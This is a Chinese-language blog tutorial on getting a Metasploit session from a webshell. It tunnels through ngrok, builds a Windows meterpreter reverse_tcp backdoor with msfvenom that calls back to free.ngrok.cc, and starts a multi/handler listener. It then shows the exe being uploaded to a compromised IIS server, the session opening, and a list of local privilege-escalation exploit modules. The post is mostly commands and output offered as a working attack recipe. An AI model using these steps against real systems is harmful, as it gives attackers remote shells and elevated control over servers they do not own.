---
title: "MSF Webshell 上线"
date: 2018-02-24T00:00:00+08:00
draft: false
tags: ['metasploit']
categories: ['web']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

ngrok 内网穿透, 搭配 metasploit 实现 webshell 上线.

<!--more-->

ngrok.cc 注册账号 开通隧道 类型 tcp

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/23/1519383205.jpg)

下载客户端

我的是 linux arm

运行

`./sunny clientid xxxx`

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/23/1519383245.jpg)

下面用 msfvenom 生成后门程序

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=free.ngrok.cc LPORT=端口 -f exe > /tmp/test.exe`

端口填之前开通隧道的远程端口

```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=free.ngrok.cc LPORT=端口 -f exe > test.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
```

监听

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 端口
```

端口填之前开通隧道的本地端口

0.0.0.0 是为了监听所有地址

```
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:4444
```

将生成的程序上传至服务器执行

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/23/1519383763.jpg)

成功反弹会话

```
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:4444
[*] Sending stage (179779 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:55460) at 2018-02-23 19:01:59 +0800

meterpreter> getuid
Server username IIS APPPOOL\baidu
meterpreter> sysinfo
Computer: WIN-XXOO
OS: Windows 2012 (Build 9200)
Architecture: x64
System Language: zh_CN
Domain: WORKGROUP
Logged on Users: 5
Meterpreter: x86/windows
meterpreter>
```

本地提权 exp 在 exploit/windows/local/ 下

```
msf exploit(multi/handler) > use exploit/windows/local/ms 
use exploit/windows/local/ms10_015_kitrap0d
use exploit/windows/local/ms10_092_schelevator
use exploit/windows/local/ms11_080_afdjoinleaf
use exploit/windows/local/ms13_005_hwnd_broadcast
use exploit/windows/local/ms13_053_schlamperei
use exploit/windows/local/ms13_081_track_popup_menu
use exploit/windows/local/ms13_097_ie_registry_symlink
use exploit/windows/local/ms14_009_ie_dfsvc
use exploit/windows/local/ms14_058_track_popup_menu
use exploit/windows/local/ms14_070_tcpip_ioctl
use exploit/windows/local/ms15_004_tswbproxy
use exploit/windows/local/ms15_051_client_copy_image
use exploit/windows/local/ms15_078_atmfd_bof     
use exploit/windows/local/ms16_016_webdav
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc 
use exploit/windows/local/ms_ndproxy
```